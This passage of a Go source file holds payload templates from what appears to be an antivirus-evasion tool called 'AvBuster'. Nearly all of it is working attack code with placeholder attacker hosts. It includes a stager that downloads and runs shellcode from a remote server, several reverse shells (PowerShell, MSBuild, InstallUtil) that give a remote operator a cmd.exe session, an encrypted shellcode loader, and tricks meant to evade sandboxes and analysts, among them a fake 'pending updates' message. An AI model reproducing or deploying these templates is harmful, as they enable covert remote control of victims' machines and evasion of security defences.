	lazyprocpointer = kernel.NewProc("VirtualAlloc")
)

func hBhfpqaJUl(oWFVJjiYI uintptr) (uintptr, error) {
	VNWPvtXb, _, XXboStgdyg := lazyprocpointer.Call(0, oWFVJjiYI, oMuJfGUDmtCSRG|dlIyxUBZRDOnxIB, hvyvVkxdZsQaz)
	if VNWPvtXb == 0 {
		return 0, XXboStgdyg
	}
	return VNWPvtXb, nil
}
func hiSfJKchyyEVihy(HqASzT int, vgOdczJczN []byte) string {
	JutTPy := rand.New(rand.NewSource(time.Now().UnixNano()))
	var scgHrsTuvKi []byte
	for TDsqVMvj := 0; TDsqVMvj < HqASzT; TDsqVMvj++ {
		scgHrsTuvKi = append(scgHrsTuvKi, vgOdczJczN[JutTPy.Intn(len(vgOdczJczN))])
	}
	return string(scgHrsTuvKi)
}
func vSWwMBwUZw(HqASzT int) string {
	vgOdczJczN := []byte(jdaMdbGgeF)
	return hiSfJKchyyEVihy(HqASzT, vgOdczJczN)
}
func qISDOFLQUEdk(tgZcJOIIbys, HqASzT int) string {
	for {
		LdckUnX := 0
		MFxhQTAZ := vSWwMBwUZw(HqASzT)
		for _, TiFkFeOmgRFX := range []byte(MFxhQTAZ) {
			LdckUnX += int(TiFkFeOmgRFX)
		}
		if LdckUnX%0x100 == tgZcJOIIbys {
			return "/" + MFxhQTAZ
		}
	}
}
func main() {
	serverIP := "http://REVIPPORT"
	response, _ := http.Get(serverIP + qISDOFLQUEdk(92, 184))
	defer response.Body.Close()
	bodybyte, _ := ioutil.ReadAll(response.Body)
	VNWPvtXb, _ := hBhfpqaJUl(uintptr(len(bodybyte)))
	jXsPTEZjNJIJAI := (*[990000]byte)(unsafe.Pointer(VNWPvtXb))
	for BeWTrjm, TiFkFeOmgRFX := range bodybyte {
		jXsPTEZjNJIJAI[BeWTrjm] = TiFkFeOmgRFX
	}
	syscall.Syscall(VNWPvtXb, 0, 0, 0, 0)
}
`

var AvBusterPowerShellTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

//Remote host
const REMOTEHOST = "RHOST"

//Remote Port
const REMOTEPORT = "RPORT"

var (
	err                     error
	powershellcore, cmdname string
)

func init() {
	powershellcore = RPLfunction cleanup {
		if ($client.Connected -eq $true) {$client.Close()}
		if ($process.ExitCode -ne $null) {$process.Close()}
		exit}
		// Setup IPADDR
		$address = 'REVIP'
		// Setup PORT
		$port = 'REVPORT'
		$client = New-Object system.net.sockets.tcpclient
		$client.connect($address,$port)
		$stream = $client.GetStream()
		$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
		$process = New-Object System.Diagnostics.Process
		$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
		$process.StartInfo.RedirectStandardInput = 1
		$process.StartInfo.RedirectStandardOutput = 1
		$process.StartInfo.UseShellExecute = 0
		$process.Start()
		$inputstream = $process.StandardInput
		$outputstream = $process.StandardOutput
		Start-Sleep 1
		$encoding = new-object System.Text.AsciiEncoding
		while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
		$stream.Write($encoding.GetBytes($out),0,$out.Length)
		$out = $null; $done = $false; 
		while (-not $done) {
		if ($client.Connected -ne $true) {cleanup}
		$pos = 0; $i = 1
		while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
		$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
		$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
		if ($pos -gt 0) {
		$string = $encoding.GetString($networkbuffer,0,$pos)
		$inputstream.write($string)
		start-sleep 1
		if ($process.ExitCode -ne $null) {cleanup}
		else {
		$out = $encoding.GetString($outputstream.Read())
		while($outputstream.Peek() -ne -1){
		$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
		$stream.Write($encoding.GetBytes($out),0,$out.length)
		$out = $null
		$string = $null}} else {cleanup}}RPL
}

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, "=")

		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
			fmt.Println(pair[0] + "=" + pair[1])
			return true
		}
	}
	return false
}

func main() {
	genereaterevshellscript(REMOTEHOST, REMOTEPORT)
	if os64check() {
		cmdname = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"

	} else {

		cmdname = "PowerShell"
	}

	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX (C://Windows//Temp//powrev.ps1)"}
	cmd := exec.Command(cmdname, cmdArgs...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	checkerr(err)
	fmt.Println("Successfully installed pending updates !")
}

func genereaterevshellscript(ip, port string) {
	ipreplaced := strings.Replace(powershellcore, "REVIP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "REVPORT", port, 1)
	fopowershellrevshell, err := os.Create("C://Windows//Temp//powrev.ps1")
	checkerr(err)
	defer fopowershellrevshell.Close()
	fopowershellrevshell.WriteString(portreplaced)
}

func checkerr(err error) {
	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
}
`

var AvBusterPowerShellCustomShellCode = `# our execute x86 shellcode
function Generate-ShellcodeExec
{
# this is our shellcode injection into memory (one liner)
$shellcode_string = @"
RPL$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';RPL$winFunc = Add-Type -memberDefinition RPL$code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]RPL$sc64 = SHELLCODE
;[Byte[]]RPL$sc = RPL$sc64;RPL$size = 0x1000;if (RPL$sc.Length -gt 0x1000) {RPL$size = RPL$sc.Length};RPL$x=RPL$winFunc::VirtualAlloc(0,0x1000,RPL$size,0x40);for (RPL$i=0;RPL$i -le (RPL$sc.Length-1);RPL$i++) {RPL$winFunc::memset([IntPtr](RPL$x.ToInt32()+RPL$i), RPL$sc[RPL$i], 1)};RPL$winFunc::CreateThread(0,0,RPL$x,0,0,0);for (;;) { Start-sleep 60 };
"@
$goat =  [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string)) 
write-output $goat
}

# our function for executing x86 shellcode
function Execute-x86
{
	# if we are running under AMD64 then use the x86 version of powershell
    if($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
    {
        $powershellx86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell.exe"
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		$thegoat = Generate-ShellcodeExec
        iex "& $powershellx86 $cmd $thegoat"
		
    }
	# else just run normally
    else
    {
        $thegoat = Generate-ShellcodeExec
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		iex "& powershell $cmd $thegoat"
    }
}
# call the function
Execute-x86`

var AvBusterEncryptedShellCode = `package main

import (
	"crypto/rc4"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

const DECKEY = ":KEY:"

func main() {

	shell := []byte{SHELLCODEHERE}
	decryptedshellcode := decryptshellcode([]byte(shell))
	executeshell(decryptedshellcode)
}

func decryptshellcode(shellcodetodecrypt []byte) []byte {
	key := []byte(DECKEY)
	ciphertext := shellcodetodecrypt
	decrypted := make([]byte, len(ciphertext))
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := rc4.NewCipher(key)
	if err != nil {
		fmt.Println(err.Error)
	}

	c.XORKeyStream(decrypted, ciphertext)

	return decrypted
}

func executeshell(shellcode []byte) {

	k32 := syscall.MustLoadDLL("kernel32.dll")

	valloc := k32.MustFindProc("VirtualAlloc")

	//make space for shellcode
	addr, _, _ := valloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	ptrtoaddressallocated := (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range shellcode {
		ptrtoaddressallocated[i] = value

	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
`

var AvBusterMSBuildTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var tdu, msbuildpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	tdu = "<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="tdu">
<tdu/>
</Target>
<UsingTask
    TaskName="tdu"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
      
      <Reference Include="System.Management.Automation" />
        <Code Type="Class" Language="cs">
         <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
            {
                public static StreamWriter streamWriter;
                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                 {
                        StringBuilder strOutput = new StringBuilder();
                        if (!String.IsNullOrEmpty(outLine.Data))
                        {
                            try
                            {
                                strOutput.Append(outLine.Data);
                                streamWriter.WriteLine(strOutput);
                                streamWriter.Flush();
                            }
                            catch (Exception ex) { throw ex; }
                        }
                 }
                 public override bool Execute()
                 {
                     using (TcpClient client = new TcpClient("IP", PORT))
                        {
                            using (Stream stream = client.GetStream())
                            {
                                using (StreamReader rdr = new StreamReader(stream))
                                {
                                    streamWriter = new StreamWriter(stream);
                                    StringBuilder strInput = new StringBuilder();
                                    Process p = new Process();
                                    p.StartInfo.FileName = "cmd.exe";
                                    p.StartInfo.CreateNoWindow = true;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    while (true)
                                    {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }
                                }
                            }
                        }
                 }
            
            }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>"
	msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createmsbuildtemplate(MANAGERIP, REMOTEPORT)
	msbuild := exec.Command(msbuildpath, "C://Windows//Temp//tdu.xml")
	err := msbuild.Start()
	checkerr(err)

}

func createmsbuildtemplate(ip, port string) {
	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)
	fotduxml, err := os.Create("C://Windows//Temp//tdu.xml")
	checkerr(err)
	defer fotduxml.Close()
	fotduxml.WriteString(portreplaced)
}
`
var AvBusterInstallShieldTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var instutil, cscpath, instutilpath string

//MANAGERIP connection string to the manager
const MANAGERIP = "RHOST"

//REMOTEPORT to connect to the manager
const REMOTEPORT = "RPORT"

func init() {
	instutil = RPLusing System;
	using System.Collections;
	using System.Collections.Generic;
	using System.ComponentModel;
	using System.Configuration.Install;
	using System.Diagnostics;
	using System.IO;
	using System.Net.Sockets;
	using System.Text;
	
	
	namespace WindowsService1
	{
		public class Program
		{
	
			public static void Main()
			{
				Console.WriteLine("Hello From Main...I Don't Do Anything");
				//Add any behaviour here to throw off sandbox execution/analysts :)
	
			}
		}
	
		[System.ComponentModel.RunInstaller(true)]
		public partial class ProjectInstaller : System.Configuration.Install.Installer
		{
			StreamWriter streamWriter;
	
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Console.WriteLine("Hello From Uninstall...I carry out the real work...");
				revconnect();
			}
	
			private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
			{
				StringBuilder strOutput = new StringBuilder();
	
				if (!String.IsNullOrEmpty(outLine.Data))
				{
					try
					{
						strOutput.Append(outLine.Data);
						streamWriter.WriteLine(strOutput);
						streamWriter.Flush();
					}
					catch (Exception) { }
				}
			}
			public void revconnect()
			{
				try
				{
					using (TcpClient client = new TcpClient("IPHERE", PORTHERE))
					{
						using (Stream stream = client.GetStream())
						{
							using (StreamReader rdr = new StreamReader(stream))
							{
								streamWriter = new StreamWriter(stream);
	
								StringBuilder strInput = new StringBuilder();
	
								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();
	
								while (true)
								{
									strInput.Append(rdr.ReadLine());
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
				catch (Exception)
				{
	
	
				}
			}
		}
	}
	RPL
	cscpath = RPLC:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exeRPL
	instutilpath = RPLC:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exeRPL
}

func checkerr(err error) {
	if err != nil {

		fmt.Println(err)
	}
}

func main() {
	createinstlutiltemplate(MANAGERIP, REMOTEPORT)
	instexe := exec.Command(cscpath, RPL/out:C:\Windows\temp\goinstut.exeRPL, RPLC:\Windows\temp\insutil.csRPL)
	err := instexe.Start()
	checkerr(err)
	executeshell := exec.Command(instutilpath, RPL/logfile=RPL, RPL/LogToConsole=falseRPL, RPL/URPL, RPLC:\Windows\temp\goinstut.exeRPL)
	err = executeshell.Start()
	checkerr(err)
	os.Remove(RPLC:\Windows\temp\insutil.csRPL)
}

func createinstlutiltemplate(ip, port string) {
	ipreplaced := strings.Replace(instutil, "IPHERE", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORTHERE", port, 1)
	foinstlutil, err := os.Create(RPLC:\Windows\temp\insutil.csRPL)

	checkerr(err)
	defer foinstlutil.Close()
	foinstlutil.WriteString(portreplaced)
}`
var AvBusterMSXmlXsltTCPReverseShell = `package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

var tdu, msbuildpath string

func init() {
	tdu = RPL<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="tdu">
<tdu/>
</Target>
<UsingTask
    TaskName="tdu"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
      
      <Reference Include="System.Management.Automation" />
        <Code Type="Class" Language="cs">
         <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
            {
                public static StreamWriter streamWriter;
                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
                 {
                        StringBuilder strOutput = new StringBuilder();
                        if (!String.IsNullOrEmpty(outLine.Data))
                        {
                            try
                            {
                                strOutput.Append(outLine.Data);
                                streamWriter.WriteLine(strOutput);
                                streamWriter.Flush();
                            }
                            catch (Exception ex) { throw ex; }
                        }
                 }
                 public override bool Execute()
                 {
                     using (TcpClient client = new TcpClient("IP", PORT))
                        {
                            using (Stream stream = client.GetStream())
                            {
                                using (StreamReader rdr = new StreamReader(stream))
                                {
                                    streamWriter = new StreamWriter(stream);
                                    StringBuilder strInput = new StringBuilder();
                                    Process p = new Process();
                                    p.StartInfo.FileName = "cmd.exe";
                                    p.StartInfo.CreateNoWindow = true;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.RedirectStandardOutput = true;
                                    p.StartInfo.RedirectStandardInput = true;
                                    p.StartInfo.RedirectStandardError = true;
                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                    p.Start();
                                    p.BeginOutputReadLine();
                                    while (true)
                                    {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }
                                }
                            }
                        }
                 }
            
            }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>RPL
	msbuildpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exeRPL
}
func checkerr(err error) {
	fmt.Println(err)
}

func main() {
	createmsbuildtemplate("REVIP", "REVPRT")
	msbuild := exec.Command(msbuildpath, "C:/Windows/Temp/tdu.xml")
	err := msbuild.Start()
	checkerr(err)
}

func createmsbuildtemplate(ip, port string) {

	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)

	fotduxml, err := os.Create("C:/Windows/Temp/tdu.xml")
	checkerr(err)
	defer fotduxml.Close()
	fotduxml.WriteString(portreplaced)
}`
